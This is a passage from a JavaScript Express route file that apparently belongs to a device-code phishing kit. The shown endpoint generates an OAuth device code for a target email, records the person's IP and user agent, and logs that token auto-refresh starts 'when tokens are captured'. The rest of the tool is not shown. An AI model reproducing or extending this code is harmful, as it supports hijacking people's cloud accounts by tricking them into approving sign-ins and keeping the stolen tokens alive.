            clientId: DEVICE_CODE_CLIENT_ID,
            tenant: TENANT,
            ip: req.ip || req.socket.remoteAddress,
            userAgent: req.headers['user-agent'],
            cae_enabled: true,
            auto_refresh_enabled: true
        };
        
        deviceCodeSessions.set(sessionId, sessionData);
        persistSessions();
        
        console.log(`[DeviceCode] Direct API generated CAE code for ${email}: ${data.user_code}`);
        console.log(`[DeviceCode] Auto-refresh will start when tokens are captured`);
        
        res.json({
            success: true,
            sessionId: sessionId,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            cae_enabled: true,
            auto_refresh: true
        });
        
    } catch (error) {
        console.error('[DeviceCode] API generation failed:', error.response?.data || error.message);
        res.status(500).json({ success: false, error: error.response?.data?.error_description || error.message });
    }
});

module.exports = { router, initRoutes };